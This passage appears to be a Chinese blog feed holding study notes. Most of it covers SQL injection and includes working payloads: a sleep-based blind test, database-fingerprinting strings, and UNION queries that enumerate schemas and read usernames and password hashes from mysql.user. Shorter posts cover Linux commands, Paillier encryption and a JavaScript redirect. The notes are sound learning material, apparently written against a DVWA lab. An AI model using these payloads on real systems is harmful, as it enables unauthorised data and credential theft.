对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=“in”<br>substr()、stbstring()、mid() 三个函数的用法、功能均一致</p></li><li><p>concat(username)：将查询到的username连在一起，默认用逗号分隔<br>concat(str1,’’,str2)：将字符串str1和str2的数据查询到一起，中间用连接group_concat(username) ：将username数据查询在一起，用逗号连接</p></li><li><p>三种注释符号： </p><h1 id><a href="#" class="headerlink" title></a></h1><p> –空格 空格可以使用+代替 （url 编码%23 表示注释）<br> /**/</p></li></ul><h2 id="四-SQL注入的类型"><a href="#四-SQL注入的类型" class="headerlink" title="四.SQL注入的类型"></a>四.SQL注入的类型</h2><h3 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h3><h4 id="数字型注入点"><a href="#数字型注入点" class="headerlink" title="数字型注入点"></a>数字型注入点</h4><p> 类似结构 <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字。</p><h4 id="字符型注入点"><a href="#字符型注入点" class="headerlink" title="字符型注入点"></a>字符型注入点</h4><p> 类似结构 <a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。 </p><p><img src="/images/1650098909906.png" alt="1650098909906"></p><p><img src="/images/1650098933704.png" alt="1650098933704"></p><h4 id="搜索型注入点"><a href="#搜索型注入点" class="headerlink" title="搜索型注入点"></a>搜索型注入点</h4><p>这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword=关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入。</p><h3 id="按数据提交的方式来分类"><a href="#按数据提交的方式来分类" class="headerlink" title="按数据提交的方式来分类"></a>按数据提交的方式来分类</h3><h4 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h4><p> 提交数据的方式是 GET , 注入点的位置在 GET 参数部分。 </p><h4 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h4><p> 使用 POST 方式提交数据，注入点位置在 POST <em>数据部分</em> 。</p><h4 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h4><p> HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。 </p><h4 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h4><p> 注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。 </p><h3 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h3><h4 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h4><p> 可以根据返回页面判断条件真假的注入。 </p><p>例如我们想要判断数据库用户名，可以用 and 拼接一个判断database长度的语句，可以用二分法，逐步判断，获取数据库长度之后进行判断数据库该用户名的第一个字母，可以将其编写成ascll码判断大小，逐步获取第一个字符，由此可以判断出该数据库的用户名。</p><h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>一般用于存在注入，但是却没有任何回显的的情况，用条件语句构造时间延迟语句是否执行（即页面返回时间是否增加）来判断。例如： id=1’and if(ascii(substring(version(),1,1))=53,sleep(3),1)   </p><h4 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h4><p> 页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 </p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p> 使用union的情况下的注入。 </p><h4 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h4><p> 可以同时执行多条语句的执行时的注入。  堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。首先访问id=1’，页面返回MySQL错误，再访问id=1’%23，页面返回正常结果。 </p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>一些网站为了安全，会把插入的数据进行转义，但是存入数据库的又是原来的数据，我们可以利用这一点，将攻击语句存入数据库，然后再次触发，以实现攻击目的。</p><p>一般有：</p><p> <strong>第一步</strong>：插入恶意数据，例如：输入参数1’，函数经过转义函数变成<code>\&#39;</code>，参数进入数据库存储还原为1’<br><strong>第二步</strong>：引用恶意数据，例如：将1’从数据库中取出 取出后直接给变量带入SQL ，<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>触发 </p><h4 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h4><h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><h4 id="SQL-注入写入webshell"><a href="#SQL-注入写入webshell" class="headerlink" title="SQL 注入写入webshell"></a>SQL 注入写入webshell</h4><h4 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h4><h2 id="五-注入点探测"><a href="#五-注入点探测" class="headerlink" title="五.注入点探测"></a>五.注入点探测</h2><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>引号判断： 无论字符型还是整型都会因为单引号个数不匹配而报错。 </p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p> 总之数字型注入不需要使用单引号闭合前面的单引号就可以执行SQL语句，而字符型必须闭合前面的单引号，然后才可以执行SQL语句，同时也需要把后面的单引号闭合，而注释就是很好的一种闭合后面的单引号的方法。 方法不唯一。</p><ol><li>id=1’无（我觉得应该是异常的）异常      id=1and 1=1—+正确显示      id=1and1=2—+ 错误          ===&gt;数字注入</li><li>id=1‘异常          id=1’and‘1’=‘1—+正确               id=1‘and’1‘=’2–+错误          ===&gt;单引号字符型注入</li></ol><p>GET型注入很容易从URL中看出来，如图，网页的URL为：<a href="http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E9%80%9A%E5%B8%B8%E4%BD%BF%E7%94%A8?%E6%9D%A5%E8%A1%A8%E7%A4%BAGET%E6%96%B9%E6%B3%95%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%EF%BC%8C%E8%80%8C%E4%BD%BF%E7%94%A8POST%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%98%BE%E7%A4%BA%E5%88%B0URL%E4%B8%AD%E7%9A%84%EF%BC%8C%E5%9B%A0%E6%AD%A4URL%E4%B8%AD%E5%90%AB%E6%9C%89%EF%BC%9F%E8%AF%B4%E6%98%8E%E5%B0%B1%E6%98%AF%E4%BD%BF%E7%94%A8GET%E6%96%B9%E6%B3%95%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%EF%BC%8C">http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1，浏览器通常使用?来表示GET方法传递参数，而使用POST传递参数是不会显示到URL中的，因此URL中含有？说明就是使用GET方法传递参数，</a></p><h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>1’ or ‘ab’=’a+’b ————–MS SQLserver数据库，字符串连接，成功这返回永真条件<br>1’ or ‘ab’=‘a’’b —————Mysql数据库，字符串连接，成功这返回永真条件<br>1’ or ‘ab’=‘a’||’b ————-Oracle数据库，字符串连接，成功这返回永真条件</p><h3 id="确定数据库权限"><a href="#确定数据库权限" class="headerlink" title="确定数据库权限"></a>确定数据库权限</h3><h3 id="查数据库的库名，表名，列名以及相应的数据"><a href="#查数据库的库名，表名，列名以及相应的数据" class="headerlink" title="查数据库的库名，表名，列名以及相应的数据"></a>查数据库的库名，表名，列名以及相应的数据</h3><p>猜测字段数：order by 3#</p><p>判断显示位：union select 1,2,3#</p><p> 获取当数据库名称和当前连接数据库的用户:  union select user(),database() </p><p> 列出所有数据库 union select 1,schema_name from information_schema.Schemata#</p><p> 列出中所有的表 -1’ union select table_name,table_schema from information_schema.tables#</p><p> 列出（数据库：mysql表：user）中的数据   -1’ union select User,Password from mysql.user#</p><p><img src="/images/1650110416731.png" alt="1650110416731"></p><p>3、还有就是Timing Attack测试，也就是时间盲注。通过简单的条件语句比如 and 1=2 是无法看出异常的。在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。<br>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。</p><h2 id="五-SQL实战"><a href="#五-SQL实战" class="headerlink" title="五.SQL实战"></a>五.SQL实战</h2><h2 id="六-SQL绕过"><a href="#六-SQL绕过" class="headerlink" title="六.SQL绕过"></a>六.SQL绕过</h2><p>6.1.大小写绕过</p><p>6.2.双写绕过</p><p>6.3.编码绕过</p><p>6.4.内联注释绕过</p><h2 id="七-关于SQL注入的防御"><a href="#七-关于SQL注入的防御" class="headerlink" title="七.关于SQL注入的防御"></a>七.关于SQL注入的防御</h2><p>7.1.过滤危险字符</p><p>7.2.使用预编译语句</p><h2 id="八-关于sqlmap"><a href="#八-关于sqlmap" class="headerlink" title="八.关于sqlmap"></a>八.关于sqlmap</h2><p>kali自带这个工具，可以直接使用</p><p>参考链接：<a href="https://blog.csdn.net/whoim_i/article/details/102733802">https://blog.csdn.net/whoim_i/article/details/102733802</a> </p><p><a href="https://blog.csdn.net/qq_42263820/article/details/110132955">https://blog.csdn.net/qq_42263820/article/details/110132955</a></p><p> <a href="https://caichuanqi.blog.csdn.net/article/details/109611296?spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-13.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-13.pc_relevant_default&utm_relevant_index=15">(57条消息) 网页是否存在SQL注入(单引号判断法)_菜鸟-传奇的博客-CSDN博客</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;h2 id=&quot;一-SQL注入原理&quot;&gt;&lt;a href=&quot;#一-SQL注入原理&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux基本命令记录</title>
    <link href="http://example.com/2022/03/31/Linux%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2022/03/31/Linux%E5%91%BD%E4%BB%A4/</id>
    <published>2022-03-31T02:02:16.264Z</published>
    <updated>2022-05-30T00:17:01.332Z</updated>
    
    <content type="html"><![CDATA[<p>==Linux命查询网址==  <a href="https://www.linuxcool.com/">Linux命令大全(手册) – 真正好用的Linux命令在线查询网站 (linuxcool.com)</a> </p><h1 id="关机开机"><a href="#关机开机" class="headerlink" title="关机开机"></a>关机开机</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 关机</span><br><span class="line">shutdown -h now</span><br><span class="line"># 开机</span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure><h1 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h1><h1 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h1><p>重启网络 <code>service networkrestart</code></p><p>查看网关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">traceroute www.baidu.com</span><br><span class="line">ip route show</span><br><span class="line">route -n</span><br><span class="line">netstat -rn</span><br><span class="line">如果是静态IP，查看本地配置文件</span><br></pre></td></tr></table></figure><h1 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free</span><br><span class="line">cat /proc/meminfo</span><br></pre></td></tr></table></figure><h1 id="查看内存-1"><a href="#查看内存-1" class="headerlink" title="查看内存"></a>查看内存</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;==Linux命查询网址==  &lt;a href=&quot;https://www.linuxcool.com/&quot;&gt;Linux命令大全(手册) – 真正好用的Linux命令在线查询网站 (linuxcool.com)&lt;/a&gt; &lt;/p&gt;
&lt;h1 id=&quot;关机开机&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>owasp top10之SQL注入</title>
    <link href="http://example.com/2022/03/31/owasp-top10%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/03/31/owasp-top10%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-30T16:00:00.000Z</published>
    <updated>2022-03-31T12:32:09.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>​       SQL 注入就是指 web 应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql 语句来实现对数据库的任意操作。 </p><p>​        在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库，在该库中，我们需要记住三个表名，分别是 schemata，tables，columns。</p><ul><li>Schemata 表存储的是该用户创建的所有数据库的库名，需要记住该表中记录数据库名的字段名为 schema_name。</li><li> Tables 表存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema 和 table_name.</li><li>Columns 表存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、columns_name。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sql注入原理&quot;&gt;&lt;a href=&quot;#sql注入原理&quot; class=&quot;headerlink&quot; title=&quot;sql注入原理&quot;&gt;&lt;/a&gt;sql注入原理&lt;/h1&gt;&lt;p&gt;​       SQL 注入就是指 web 应用程序对用户输入的数据合法性没有过滤或者是判断，前端传</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Paillier加密算法学习</title>
    <link href="http://example.com/2021/11/20/Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/11/20/Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-19T16:00:00.000Z</published>
    <updated>2021-11-20T11:55:45.111Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Paillier"><a href="#Paillier" class="headerlink" title="Paillier"></a>Paillier</h1><h2 id="Paillier方案原理"><a href="#Paillier方案原理" class="headerlink" title="Paillier方案原理"></a>Paillier方案原理</h2><h3 id="1-加法同态加密定义"><a href="#1-加法同态加密定义" class="headerlink" title="1 加法同态加密定义"></a>1 加法同态加密定义</h3><p>在描述具体方案之前，我们先定义加法PHE。首先列举方案具有的所有算法。</p><ul><li><p>KeyGen()：密钥生成算法。用于产生加密数据的公钥PK（Public Key）和私钥SK（Secret Key），以及一些公开常数PP（Public Parameter）；</p></li><li><p>Encrypt()：加密算法。使用PK对用户数据Data进行加密，得到密文CT（Ciphertext）；</p></li><li><p>Decrypt()：解密算法。用于解密得到数据原文PT（Plaintext）。</p></li></ul><p>HE除了加解密以外，还具有在密文上进行处理的能力，所以还应拥有“处理”算法。对于加法PHE，支持的算法有同态加以及同态标量乘（标量乘法可看作多次加法）。</p><ul><li><p>Add()：同态加算法。输入两个CT进行同态加运算。</p></li><li><p>ScalaMul()：同态标量乘算法。输入一个CT和一个标量PT，计算CT的标量乘结果。</p></li></ul><h3 id="2-Paillier方案描述"><a href="#2-Paillier方案描述" class="headerlink" title="2 .Paillier方案描述"></a>2 .Paillier方案描述</h3><p>原版Paillier方案于论文[1]中提出，下面对方案进行描述：</p><p><strong>密钥生成</strong></p><ol><li>随机选择两个大素数p, q满足 g c d ( p q , ( p − 1 ) ( q − 1 ) ) = 1，且满足p,q长度相等</li><li>计算n = pq以及 <img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8hB7pmaTbXM9xDnwxYTmibO3k6mhNoVP6mD7TNcnNBpqiaa91aBTNrW0Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片">= lcm(p-1,q-1)，这里lcm表示最小公倍数，|n|为n的比特长度</li><li>随机选择整数<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H89sk6o8IEInqj3YPViapbzmFsXxXAZExr4VBVKcdziaF4OFBgzUJY6crA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li><li>定义L函数：<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H88duCtibT0KPSXjiaOxgIIa2cTMt2gdA6NfkzaCgEUichRcsvbNazxdxeQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"> ，计算<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8nMjJHFicBJln9gajkGicYAiamXNZvdrLTfvwPiaW7ibntv5GMlxTShjicl1g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li></ol><p>公钥： (n，g)，私钥：(<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8hB7pmaTbXM9xDnwxYTmibO3k6mhNoVP6mD7TNcnNBpqiaa91aBTNrW0Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片">,<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8plwcwOOVbHFzzwzicwhfWuMZ9Xz1c0abqL1HhM7mTMZ3NznHDEg7EgA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片">)</p><p><strong>加密</strong></p><ol><li>输入明文消息m， 满足<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8p89kNv9SVEfDcUDGICcnU56Jk0icESDNpyx7G9GupQDAaEZCZM7wANw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li><li>选择随机数r满足<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8RYa4iaz6HDu2wwbc2sticLOfu2w1xExn1QsRibiavPIIQDeU7FXwJl0cibw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li><li>计算密文<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8KhydoxAfpcm24zykickB68GPuqumtvdibYiafVAF7RUDELEic6UjRktVXQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li></ol><p><strong>解密</strong></p><ol><li>输入密文c，满足<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8UWJXDUFZENXyJRVrs0iaaFiatVibgzUMlia6H3yCbZDb1X6icOoZianDnd5Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li><li>计算明文消息<img src="https://mmbiz.qpic.cn/mmbiz_jpg/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8uHCbDA5O9D7z9rl1ALuwHTVUQ30nA0iaaCle8lxaThBNCeXwKAe0Efw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li></ol><p><strong>同态加</strong></p><ol><li>对于密文<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8micY5TBR2y9j9Mn9J19dH0uSbfhuD2RuRKqL9Tc9KfWSZyNoLNIEkmw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片">和<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8pXz6JUtgfibcjy81chaQx8Iby1icpl1NIEmP6qicwEiaZIxTIqGs8Pf30g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片">，计算<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8DllEv1LQ2UgqkuB1PicKvJq6kbXicfzibfC1NPJhcUGfdsCyWqM67yGgg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li></ol><p><strong>同态标量乘</strong></p><ol><li>对于密文<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8micY5TBR2y9j9Mn9J19dH0uSbfhuD2RuRKqL9Tc9KfWSZyNoLNIEkmw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片">和标量a，计算<img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H81DeCmtbIva4QdQLegtcoBibhtCDLVQY7o0zCzBw0ia8pvFXFSFYQhN5A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li></ol><h3 id="3-正确性和安全性"><a href="#3-正确性和安全性" class="headerlink" title="3 正确性和安全性"></a>3 正确性和安全性</h3><p><strong>加解密正确性</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8icKs31SZR0rYpjBGj5pg9nye1P2fkTiaaoiadFYia3HZAFQM4K2L2vibcbg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>同态加正确性</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8WKaRo6RdU2LibshmdKaf2v32rPwHu0A97044Z5SUv3aOxG4iagY2FWdw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>同态标量乘正确性</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Z6bicxIx5naLwibdEtUibY1DhlWbRuzz4H8XW4Smbg4MjGpDh7nHOjDehbib9UyDWYG3ePJvZicYIKWh8rvhlbW8rxA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>安全性</strong></p><p>Paillier方案满足加密方案的标准安全定义：语义安全，即在选择明文攻击下的密文的不可区分性（IND-CPA）。直观地说，就是密文不会泄露明文中的任意信息。方案安全性可以归约到判定性合数剩余假设（Decisional Composite Residuosity Assumption, DCRA），即给定一个合数n和整数z，判定z是否在n^2下是否是n次剩余是困难的。这个假设经过了几十年的充分研究，到目前为止还没有多项式时间的算法可以攻破，所以Paillier加密方案的安全性被认为相当可靠。</p><p>参考文献：</p><p><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1637379742&amp;ver=3447&amp;signature=B1*kCo1ank92hE*YaqYrBNQmZEnavW79AK-R3VmkNp87zTGjG9zI0lpQJy3F32dC2gTbBByTrDTsbaybTwTu*MnZTM5ydPy43zEEMvVPHtJTXZQtS2ZKDZXHRVzXFgju&amp;new=1">https://mp.weixin.qq.com/s?src=11&amp;timestamp=1637379742&amp;ver=3447&amp;signature=B1*kCo1ank92hE*YaqYrBNQmZEnavW79AK-R3VmkNp87zTGjG9zI0lpQJy3F32dC2gTbBByTrDTsbaybTwTu*MnZTM5ydPy43zEEMvVPHtJTXZQtS2ZKDZXHRVzXFgju&amp;new=1</a></p><p><a href="https://blog.csdn.net/qq_40589204/article/details/116310125?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-10-116310125.pc_agg_new_rank&amp;utm_term=paillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_40589204/article/details/116310125?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-10-116310125.pc_agg_new_rank&amp;utm_term=paillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95&amp;spm=1000.2123.3001.4430</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;Paillier&quot;&gt;&lt;a href=&quot;#Paillier&quot; class=&quot;headerlink&quot; title=&quot;Paillier&quot;&gt;&lt;/a&gt;Paillier&lt;/h1&gt;&lt;h2 id=&quot;Paillier方案原理&quot;&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JS操作问题</title>
    <link href="http://example.com/2021/11/20/%E5%89%8D%E7%AB%AF%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/JS%E6%93%8D%E4%BD%9C%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/11/20/%E5%89%8D%E7%AB%AF%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/JS%E6%93%8D%E4%BD%9C%E9%97%AE%E9%A2%98/</id>
    <published>2021-11-19T16:00:00.000Z</published>
    <updated>2021-11-20T11:55:50.831Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="JS操作问题"><a href="#JS操作问题" class="headerlink" title="JS操作问题"></a>JS操作问题</h1><h2 id="1-alert（）弹出框确认后，实现页面跳转"><a href="#1-alert（）弹出框确认后，实现页面跳转" class="headerlink" title="1.alert（）弹出框确认后，实现页面跳转"></a>1.alert（）弹出框确认后，实现页面跳转</h2><p><strong>代码实现：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;爱的平台&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./reset.css&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    .love&#123;</span><br><span class="line">       color: brown;</span><br><span class="line">       font-size: 50px;</span><br><span class="line">       margin-top: 30px;</span><br><span class="line">       margin-left: 550px;</span><br><span class="line">    &#125;</span><br><span class="line">    .shuru&#123;</span><br><span class="line">        margin-top: 70px;</span><br><span class="line">       margin-left: 550px;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">   </span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;p 